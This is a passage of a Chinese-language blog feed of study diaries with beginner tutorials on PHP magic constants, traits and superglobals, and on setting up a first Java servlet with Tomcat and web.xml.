<span class="keyword">__FUNCTION__</span> ;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$t = <span class="keyword">new</span> test();</span></span><br><span class="line"><span class="php">$t-&gt;_print();</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类名为：<span class="built_in">test</span></span><br><span class="line">函数名为：_print</span><br></pre></td></tr></table></figure></p><h2 id="TRAIT"><a href="#TRAIT" class="headerlink" title="_TRAIT_"></a>_TRAIT_</h2><p>Trait的名字。自PHP5.4起，PHP实现代码复用的一个方法，称为traits</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">trait</span> SayWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">parent</span>::sayHello();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> MyHelloWorld();</span></span><br><span class="line"><span class="php">$o-&gt;sayHello();</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure></p><h2 id="METHOD"><a href="#METHOD" class="headerlink" title="_METHOD_"></a>_METHOD_</h2><p>返回类的方法名。返回该方法被定义时的名字<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . <span class="keyword">__METHOD__</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">test();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名为：<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><h2 id="NAMESPACE"><a href="#NAMESPACE" class="headerlink" title="_NAMESPACE_"></a>_NAMESPACE_</h2><p>返回当前命名空间的名称(区分大小写)<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'命名空间为："'</span>, <span class="keyword">__NAMESPACE__</span>, <span class="string">'"'</span>; <span class="comment">// 输出 "MyProject"</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命名空间为：<span class="string">"MyProject"</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP中定义函数使用function关键字</p><p>2.魔术常量_FUNCTION_和_METHOD_的区别在于，_FUNCTION_只返回方法(函数)的名字；_METHOD_会返回类名和方法的名字</p><p>3.PHP中的trait关键字是实现代码复用的方法，是为了PHP的单继承性质而准备的一种代码复用机制</p><p>trait的基本用法<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ezcReflectionReturnInfo</span> </span>&#123;</span><br><span class="line">    function getReturnType() &#123; <span class="comment">/*1*/</span> &#125;</span><br><span class="line">    function getReturnDescription() &#123; <span class="comment">/*2*/</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionMethod</span> </span>&#123;</span><br><span class="line">    use ezcReflectionReturnInfo;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionFunction</span> <span class="keyword">extends</span> <span class="title">ReflectionFunction</span> </span>&#123;</span><br><span class="line">    use ezcReflectionReturnInfo;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>优先级顺序:</p><p>从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">trait</span> SayWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">parent</span>::sayHello();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> MyHelloWorld();</span></span><br><span class="line"><span class="php">$o-&gt;sayHello();</span></span><br></pre></td></tr></table></figure></p><p>修改方法的访问控制</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">trait</span> HelloWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 修改 sayHello 的访问控制</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass1</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">protected</span>; &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 给方法一个改变了访问控制的别名</span></span></span><br><span class="line"><span class="php"><span class="comment">// 原版 sayHello 的访问控制则没有发生变化</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">private</span> <span class="title">myPrivateHello</span>; &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>更多用法可以参考手册<br><a href="https://www.php.net/manual/zh/language.oop5.traits.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.traits.php</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;h2 id=&quot;创建PHP函数&quot;&gt;&lt;a href=&quot;#创建PHP函数&quot; class=&quot;headerlink&quot; title=&quot;创建PHP函数&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-2020/7/7-学习日记</title>
    <link href="http://yoursite.com/2020/07/07/JavaWeb-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/07/JavaWeb-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-07T12:55:56.000Z</published>
    <updated>2020-07-07T14:31:26.393Z</updated>
    
    <content type="html"><![CDATA[<p>阿西吧，上课时候没看视频，现在来还债了，两周学完JavaWeb基础，太难了</p><h1 id="用IDEA创建JavaWeb项目并部署"><a href="#用IDEA创建JavaWeb项目并部署" class="headerlink" title="用IDEA创建JavaWeb项目并部署"></a>用IDEA创建JavaWeb项目并部署</h1><p>第一步先在创建好的project下创建一个新的Module，Module要注意勾选JavaWeb Application，随便命名，就命名一个HelloWorld吧<br><img src="/img/JavaWeb/7-7学习日记/0.png" alt="avatar"><br>创建好应该是上图所示的状态</p><p>接下来在src下创建class文件，创建就好不用写什么东西</p><p>接着可以看到有一个web项目，那就表示我们创建了对的JavaWeb的Module</p><p><img src="/img/JavaWeb/7-7学习日记/1.png" alt="avatar"></p><p>接下来找到这个地方 配置tomcat ，配置方法百度就行不再细说</p><p>配置好了之后 我们打开web下 找到index.jsp 吧bode标签里的内容改一下，这个内容就是等下运行时显示在浏览器上的内容</p><p>修改好之后 直接运行即可，会自动打开浏览器，看到效果<br><img src="/img/JavaWeb/7-7学习日记/2.png" alt="avatar"></p><h1 id="Web项目目录结构"><a href="#Web项目目录结构" class="headerlink" title="Web项目目录结构"></a>Web项目目录结构</h1><p>在运行之后，我们看到out目录下会出现一个叫做WEB-INF的项目，WEB-INF是不能通过浏览器访问的，也就是说对用户来说是不可见的内容，里面的内容只要是web.xml的配置文件以及一个classes项目，下面存储的就是你在src中编写的内容</p><p>不在WEB-INf里的内容 都可以从浏览器直接访问，无论是静态的还是动态的网页<br><img src="/img/JavaWeb/7-7学习日记/3.png" alt="avatar"></p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li><p>Servlet全称是Java Servlet，是用Java编写的服务器端程序。其主要功能在于交互式地浏览和修改数据，生成动态Web内容</p></li><li><p>Servlet是JavaWeb的核心内容，是Java Web三大组件之一(Servlet,Filter,Listener)</p></li><li><p>在HTTP请求过程中会把请求的参数存放在请求行的URL中，或是请求体中，这个参数需要服务器来接受解析并处理，Servlet就是用来处理这个过程的</p></li></ul><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul><li><p>用来处理客户端发来的请求，并对该请求做出响应</p></li><li><p>获取接受客户端发送来的请求数据</p></li><li><p>处理请求</p></li><li><p>将处理的结果通过响应发送到客户端</p></li></ul><h2 id="编写第一个Servlet"><a href="#编写第一个Servlet" class="headerlink" title="编写第一个Servlet"></a>编写第一个Servlet</h2><ul><li>Servlet程序必须要编写实现类，通常是继承javax.servlet.http.HttpServlet</li></ul><h3 id="创建project以及相关设置"><a href="#创建project以及相关设置" class="headerlink" title="创建project以及相关设置"></a>创建project以及相关设置</h3><p>首先第一步创建一个project，并勾选web application</p><p>然后在web下的WEB-INF下创建文件夹命名为classes和lib</p><p><img src="/img/JavaWeb/7-7学习日记/4.png" alt="avatar"></p><p>然后打开File找到Project Structure<br><img src="/img/JavaWeb/7-7学习日记/5.png" alt="avatar"><br>将其改为你自己的classes路径 两个都要改</p><p>接着在Dependencies里点击+号 添加Jars，并且选择WEB-INF下的lib文件夹<br><img src="/img/JavaWeb/7-7学习日记/6.png" alt="avatar"></p><p>在Artifacts中将output directory改为你tomcat中webapps下创建的同名文件夹<br><img src="/img/JavaWeb/7-7学习日记/7.png" alt="avatar"></p><p>接着就是配置tomcat了，默认配置就行，配置方法百度，不细说</p><h3 id="创建servlet并编写servlet"><a href="#创建servlet并编写servlet" class="headerlink" title="创建servlet并编写servlet"></a>创建servlet并编写servlet</h3><p>在src下创建servlet，不是直接创建classes，将其命名为shoppingservlet</p><p>package随意就好</p><p><img src="/img/JavaWeb/7-7学习日记/8.png" alt="avatar"></p><p>编写servlet成这样<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">PrintWriter</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"shoppingservlet"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">shoppingservlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        response.setContentType(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> out=response.getWriter();</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">"this is servlet"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="配置xml文件"><a href="#配置xml文件" class="headerlink" title="配置xml文件"></a>配置xml文件</h3><p>你还需要配置xml文件，打开web.xml文件，将其改为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shoppingservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.cyl.shoppingservlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shoppingservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/A<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>/A可以随意，改成/B /C都可以</p><h3 id="运行servlet"><a href="#运行servlet" class="headerlink" title="运行servlet"></a>运行servlet</h3><p>所有步骤都完毕之后，就可以直接运行了，点击运行按钮，会自动打开浏览器，URL为localhost:8080</p><p>访问<code>http://localhost:8080/shoppingservlet/A</code></p><p>即可看到this is servlet </p><p>这样一个servlet就编译并运行成功了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;阿西吧，上课时候没看视频，现在来还债了，两周学完JavaWeb基础，太难了&lt;/p&gt;
&lt;h1 id=&quot;用IDEA创建JavaWeb项目并部署&quot;&gt;&lt;a href=&quot;#用IDEA创建JavaWeb项目并部署&quot; class=&quot;headerlink&quot; title=&quot;用IDEA创建Ja
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/7-学习日记</title>
    <link href="http://yoursite.com/2020/07/07/PHP-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/07/PHP-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-07T07:27:27.000Z</published>
    <updated>2020-07-07T13:01:40.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><p>PHP4.1.X后就启用了超全局变量，可以在脚本的任意位置运行</p><p>PHP的超全局变量有:</p><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><p>$GLOBALS是PHP的一个超级全局变量组，在PHP脚本的全部作用域，也就是任意位置都可以直接访问到</p><p>$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="number">75</span>;</span></span><br><span class="line"><span class="php">$y = <span class="number">25</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">addition</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $GLOBALS[<span class="string">'z'</span>] = $GLOBALS[<span class="string">'x'</span>] + $GLOBALS[<span class="string">'y'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">addition();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><br>在这个例子中可以看到变量z并没有提前定义，而是使用$GLOBALS来进行创建超全局变量，变量z同样可以在函数外访问</p><p>$GLOBALS是PHP中最常用的超全局变量</p><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>$_SERVER是一个包含了诸多信息的数组，例如信息头header,路径path,以及脚本的位置等</p><p>数组中的项目都是由WEB服务器创建的，不能够保证每个服务器都提供全部项目，而是根据服务器来进行动态的调整</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'PHP_SELF'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'SERVER_NAME'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_HOST'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'SCRIPT_NAME'</span>];</span></span><br></pre></td></tr></table></figure><p>下表列出了所有$_SERVER中的重要元素</p><div class="table-container"><table><thead><tr><th>描述</th><th>引入方法 </th></tr></thead><tbody><tr><td>$_SERVER[‘PHP_SELF’]</td><td>当前执行脚本的文件名，与document root有关</td></tr><tr><td>$_SERVER[‘GATEWAY_INTERFACE’]</td><td>服务器使用的CGI规范的版本</td></tr><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>当前运行脚本所在服务器的IP地址</td></tr><tr><td>$_SERVER[‘SERVER_NAME’]</td><td>当前运行脚本所在服务器的主机名</td></tr><tr><td>$_SERVER[‘SERVER_SOFTWARE’]</td><td>服务器标识字符串，在响应请求时的头信息中给出</td></tr><tr><td>$_SERVER[‘SERVER_PROTOCOL’]</td><td>请求页面时通信协议的名称和版本</td></tr><tr><td>$_SERVER[‘REQUEST_METHOD’]</td><td>访问页面使用的请求方法</td></tr><tr><td>$_SERVER[‘REQUEST_TIME’]</td><td>请求开始时的时间戳</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT’]</td><td>当前请求头中Accept项的内容，如果存在的话</td></tr><tr><td>$_SERVER[‘HTTP_HOST’]</td><td>当前请求头中Host:项的内容，如果存在的话</td></tr><tr><td>$_SERVER[‘HTTPS’]</td><td>如果脚本是通过HTTPS协议被访问，则被设为一个非空的值</td></tr><tr><td>$_SERVER[‘REMOTE_ADDR’]</td><td>当前页面的用户的IP地址</td></tr><tr><td>$_SERVER[‘REMOTE_HOST’]</td><td>当前页面的用户的主机名</td></tr><tr><td>$_SERVER[‘REMOTE_PORT’]</td><td>用户机器上连接到Web服务器所使用的端口号</td></tr><tr><td>$_SERVER[‘SCRIPT_FILENAME’]</td><td>当前执行脚本的绝对路径</td></tr><tr><td>$_SERVER[‘SCRIPT_URI’]</td><td>URI 用来指定要访问的页面</td></tr></tbody></table></div><p>还有很多参数不常用，具体可以参考一下手册</p><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>$_REQUEST用于收集HTML表单提交的数据<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"</span>&gt;</span></span><br><span class="line">Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span 